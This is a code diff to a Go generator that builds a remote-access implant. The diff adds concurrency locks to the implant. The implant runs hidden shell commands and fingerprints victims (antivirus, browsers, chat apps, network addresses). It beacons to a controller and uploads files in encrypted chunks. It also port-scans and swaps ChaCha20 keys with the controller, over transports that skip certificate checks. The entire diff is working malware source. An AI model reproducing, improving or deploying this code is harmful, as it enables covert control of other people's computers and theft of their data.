@@ -23,10 +23,10 @@ func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
 		tls_str = ""
 	}
 	if os == "win" {
-		os_str = `command := exec.Command(version, "/C", cmd); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
+		os_str = `a_Mutex.RLock();command := exec.Command(version, "/C", cmd);a_Mutex.RUnlock(); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
 		sys_str = `"syscall"`
 	} else {
-		os_str = `cmdObj := exec.Command(version, "-c", cmd);result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
+		os_str = `a_Mutex.RLock();cmdObj := exec.Command(version, "-c", cmd);a_Mutex.RUnlock();result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
 		sys_str = ""
 	}
 	if os == "android" {
@@ -289,13 +289,13 @@ func matchChatApps(lowerSet map[string]bool) string {
 	return strings.Join(apps, ",")
 }
 func getWindowsVersion() string {
-	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
+	key_, err := registry.OpenKey(registry.LOCAL_MACHINE,
 		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
 	if err != nil {
 		return "unknown"
 	}
-	defer key.Close()
-	productName, _, err := key.GetStringValue("ProductName")
+	defer key_.Close()
+	productName, _, err := key_.GetStringValue("ProductName")
 	if err != nil {
 		return "unknown"
 	}
@@ -339,7 +339,8 @@ func send() { //发送头部信息
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
 	executable, _ := os.Executable()
-    dataList := []string{clientname,user,osname,strconv.Itoa(int(delay)),getInternalIPs(),currentDir,version,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter)),executable,macs,cpuInfo,Antivirus,Browsers,ChatApps,memoryStr,systemType,Arm,}
+    a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
+    dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,macs,cpuInfo,Antivirus,Browsers,ChatApps,memoryStr,systemType,Arm,}
     encodedData, err := json.Marshal(dataList)
     if err != nil {
         return
@@ -358,7 +359,8 @@ func send() { //发送头部信息
             currentDir = strings.ReplaceAll(currentDir, "\\", "/")
             parts := strings.Split(master, ":")
 			executable, _ := os.Executable()
-            dataList := []string{clientname,user,osname,strconv.Itoa(int(delay)),getInternalIPs(),currentDir,version,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter)),executable,}
+            a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
+            dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
             encodedData, err := json.Marshal(dataList)
             if err != nil {return}
             add_str := string(encodedData)
@@ -426,21 +428,76 @@ func send() { //发送头部信息
     }
     if protocol == "quic" {
         prototime = `
-            if transport != nil && transport.QUICConfig != nil {
-                if delay >= 30 {
-                    transport.QUICConfig.MaxIdleTimeout = 5 * time.Second
-                } else {
-                    transport.QUICConfig.MaxIdleTimeout = 0
-                }
+            mt := time.Duration(0)
+            if d >= 30 {
+                mt = 5 * time.Second
+            }
+            nt := &http3.Transport{
+                TLSClientConfig: &tls.Config{
+                    InsecureSkipVerify: true,
+                    MinVersion:         tls.VersionTLS13,
+                },
+                QUICConfig: &quic.Config{MaxIdleTimeout: mt, KeepAlivePeriod: 0},
+            }
+            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
+            clientMutex.Lock()
+            old := transport
+            transport, client = nt, nc
+            clientMutex.Unlock()
+            if old != nil {
+                old.Close()
             }`
-    } else if protocol == "http" || protocol == "https" {
+    } else if protocol == "https" {
         prototime = `
-            if transport != nil {
-                if delay >= 30 {
-                    transport.IdleConnTimeout = 5 * time.Second
-                } else {
-                    transport.IdleConnTimeout = 0
-                }
+            to := time.Duration(0)
+            if d >= 30 {
+                to = 5 * time.Second
+            }
+            nt := &http.Transport{
+                MaxConnsPerHost:     1,
+                MaxIdleConns:        1,
+                MaxIdleConnsPerHost: 1,
+                DisableKeepAlives:   false,
+                ForceAttemptHTTP2:   true,
+                DialContext: (&net.Dialer{
+                    Timeout:   30 * time.Second,
+                    KeepAlive: 30 * time.Second,
+                }).DialContext,
+                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                IdleConnTimeout: to,
+            }
+            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
+            clientMutex.Lock()
+            old := transport
+            transport, client = nt, nc
+            clientMutex.Unlock()
+            if old != nil {
+                old.CloseIdleConnections()
+            }`
+    } else if protocol == "http" {
+        prototime = `
+            to := time.Duration(0)
+            if d >= 30 {
+                to = 5 * time.Second
+            }
+            nt := &http.Transport{
+                MaxConnsPerHost:     1,
+                MaxIdleConns:        1,
+                MaxIdleConnsPerHost: 1,
+                DisableKeepAlives:   false,
+                DialContext: (&net.Dialer{
+                    Timeout:   30 * time.Second,
+                    KeepAlive: 30 * time.Second,
+                }).DialContext,
+                IdleConnTimeout: to,
+            }
+            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
+            clientMutex.Lock()
+            old := transport
+            transport, client = nt, nc
+            clientMutex.Unlock()
+            if old != nil {
+                old.CloseIdleConnections()
             }`
     }
     if protocol == "quic" {
@@ -501,6 +558,7 @@ func send() { //发送头部信息
         master string = /*server*/
         key []byte
         keyMutex sync.RWMutex
+        clientMutex sync.RWMutex
         /*header*/
     )
     /*inithttp*/
@@ -515,7 +573,9 @@ func send() { //发送头部信息
             for key_, value := range get_headers {
                 req.Header.Set(key_, value)
             }
+            clientMutex.RLock()
             resp, err := client.Do(req)
+            clientMutex.RUnlock()
             if err != nil {
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
@@ -553,7 +613,9 @@ func send() { //发送头部信息
             for key_, value := range post_headers {
                 req.Header.Set(key_, value)
             }
+            clientMutex.RLock()
             resp, err := client.Do(req)
+            clientMutex.RUnlock()
             if err != nil {
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
@@ -602,7 +664,9 @@ func send() { //发送头部信息
                 maxRetry = delay
             }
             a_Mutex.RUnlock()
+            clientMutex.RLock()
             response, err := client.Get(url)
+            clientMutex.RUnlock()
             if err != nil {
                 retryCount++
                 if retryCount < maxRetry {
@@ -658,7 +722,8 @@ func send() { //发送头部信息
             if encryptedChunk == nil {return}
             retryCount := 0
             for retryCount < maxRetry {
-                dataList := []string{clientname,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
+                a_Mutex.RLock();clientname_ := clientname;a_Mutex.RUnlock()
+                dataList := []string{clientname_,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
                 encodedData, err := json.Marshal(dataList)
                 if err != nil {
                     return
@@ -675,7 +740,9 @@ func send() { //发送头部信息
                 url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
                 req, _ := http.NewRequest("POST", url, &buffer)
                 req.Header.Set("Content-Type", writer.FormDataContentType())
+                clientMutex.RLock()
                 resp, err := client.Do(req)
+                clientMutex.RUnlock()
                 if err == nil && resp.StatusCode == http.StatusOK {
                     resp.Body.Close()
                     break
@@ -713,7 +780,7 @@ func send() { //发送头部信息
                 continue
             }
             if respBody == uid {
-                onece = true
+                a_Mutex.Lock();onece = true;a_Mutex.Unlock()
                 run()
                 return
             }
@@ -795,7 +862,7 @@ func send() { //发送头部信息
                 if !ok || newVersion == "" {
                     continue
                 }
-                version = newVersion
+                a_Mutex.Lock();version = newVersion;a_Mutex.Unlock()
             case "CHANG_FILE_NAME":
                 oldPath, ok1 := getArg(args, 0)
                 newName, ok2 := getArg(args, 1)
@@ -942,8 +1009,9 @@ func send() { //发送头部信息
             return
         }
         a_Mutex.Lock()
-        defer a_Mutex.Unlock()
         delay = int(parsedTime)
+        d := delay
+        a_Mutex.Unlock()
         /*prototime*/
         return
     }
@@ -967,7 +1035,7 @@ func send() { //发送头部信息
         }
         return port_list
     }
-    func scan_u_firends(ip, portList, delay, option string) {
+    func scan_u_firends(ip, portList, delay_, option string) {
         var resultBuilder strings.Builder
         var mutex sync.Mutex
         var open_ports, re_url string
@@ -975,7 +1043,7 @@ func send() { //发送头部信息
         if len(port_list) > 65535 {
             return
         }
-        sleep_time, err := strconv.Atoi(delay)
+        sleep_time, err := strconv.Atoi(delay_)
         if err != nil || sleep_time <= 0 {
             return
         }
@@ -1049,8 +1117,6 @@ func send() { //发送头部信息
     func rotl(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n))}
     func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {a += b; d ^= a; d = rotl(d, 16); c += d; b ^= c; b = rotl(b, 12); a += b; d ^= a; d = rotl(d, 8); c += d; b ^= c; b = rotl(b, 7); return a, b, c, d}
     func initializeState(counter uint32, nonce [12]byte) [16]uint32 {
-		keyMutex.RLock()
-		defer keyMutex.RUnlock()
 		if len(key) != 32 {var b [64]byte;if _, err := crand.Read(b[:]); err != nil {panic(err)};var state [16]uint32;for i := range state {state[i] = binary.LittleEndian.Uint32(b[i*4 : i*4+4])};return state}
 		return [16]uint32{
 			0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,binary.LittleEndian.Uint32(key[0:4]),binary.LittleEndian.Uint32(key[4:8]),binary.LittleEndian.Uint32(key[8:12]),binary.LittleEndian.Uint32(key[12:16]),binary.LittleEndian.Uint32(key[16:20]),binary.LittleEndian.Uint32(key[20:24]),binary.LittleEndian.Uint32(key[24:28]),binary.LittleEndian.Uint32(key[28:32]),counter,binary.LittleEndian.Uint32(nonce[0:4]),binary.LittleEndian.Uint32(nonce[4:8]),binary.LittleEndian.Uint32(nonce[8:12]),
@@ -1076,10 +1142,10 @@ func send() { //发送头部信息
         }
         return out
     }
-    func ChaCha20Encrypt(data []byte, nonce [12]byte, counter uint32) []byte {
+    func ChaCha20Encrypt(data []byte, nonce [12]byte, counter uint32, k []byte) []byte {
         out := make([]byte, len(data))
         for i := 0; i < len(data); i += 64 {
-            block := chacha20Block(counter, nonce)
+            block := chacha20Block(counter, nonce, k)
             n := len(data) - i
             if n > 64 {
                 n = 64
@@ -1092,24 +1158,32 @@ func send() { //发送头部信息
         return out
     }
     func Encrypt(input []byte) []byte {
+        keyMutex.RLock()
+        k := key
+        keyMutex.RUnlock()
+        if len(k) != 32 {
+            return nil
+        }
         var nonce [12]byte
         if _, err := crand.Read(nonce[:]); err != nil {
             return nil
         }
-        cipher := ChaCha20Encrypt(input, nonce, 0)
+        cipher := ChaCha20Encrypt(input, nonce, 0, k)
         out := make([]byte, 12+len(cipher))
         copy(out[:12], nonce[:])
         copy(out[12:], cipher)
         return out
     }
     func Decrypt(input []byte) []byte {
-        if len(input) < 12 {
+        keyMutex.RLock()
+        k := key
+        keyMutex.RUnlock()
+        if len(input) < 12 || len(k) != 32 {
             return nil
         }
         var nonce [12]byte
         copy(nonce[:], input[:12])
-        cipher := input[12:]
-        return ChaCha20Encrypt(cipher, nonce, 0)
+        return ChaCha20Encrypt(input[12:], nonce, 0, k)
     }
     func get_decry_f(filepath string, data []byte) error {
 		if len(data) == 0 {
@@ -1162,17 +1236,17 @@ func send() { //发送头部信息
         }
         return buf.String()
     }
-    // 解码函数（无 padding）
     func customBase64Decode(s string) []byte {
         var (
             val  uint32
             valb int
         )
+        a_Mutex.RLock()
+        m := decodeMap
+        a_Mutex.RUnlock()
         out := make([]byte, 0, len(s))
         for i := 0; i < len(s); i++ {
-			a_Mutex.RLock()
-            v, ok := decodeMap[s[i]]
-			a_Mutex.RUnlock()
+            v, ok := m[s[i]]
             if !ok {
                 continue
             }
@@ -1272,21 +1346,29 @@ func send() { //发送头部信息
 		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + ciphertextBase64
         getUrl(key_url)
         keyMutex.Lock();key = sharedKey;keyMutex.Unlock()
-        onece = false
+        a_Mutex.Lock();onece = false;a_Mutex.Unlock()
 	}
     func run() {
-        if onece {
+        a_Mutex.RLock();runonece:=onece;a_Mutex.RUnlock()
+        if runonece {
             a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
             if uid == "" {uid = generateUUID()}
-            keyMutex.Lock();key = nil;keyMutex.Unlock()
-            if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
-            clientname,_ = os.Hostname()
-            client_b := customBase64Encode([]byte(clientname))
+            host, _ := os.Hostname()
+            ver := "cmd"
+            switch osname {
+            case "linux", "macos":
+                ver = "bash"
+            case "android":
+                ver = "/system/bin/sh"
+            }
+            a_Mutex.Lock();version = ver;clientname = host;a_Mutex.Unlock()
+            client_b := customBase64Encode([]byte(host))
             url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
             for {
                 generateAndUpdateKey(url)
                 keyMutex.RLock();key_ := key;keyMutex.RUnlock()
-                if !onece && len(key_) == 32 {
+                a_Mutex.RLock();onece_:=onece;a_Mutex.RUnlock()
+                if !onece_ && len(key_) == 32 {
                     send()
                     getCmd()
                 }
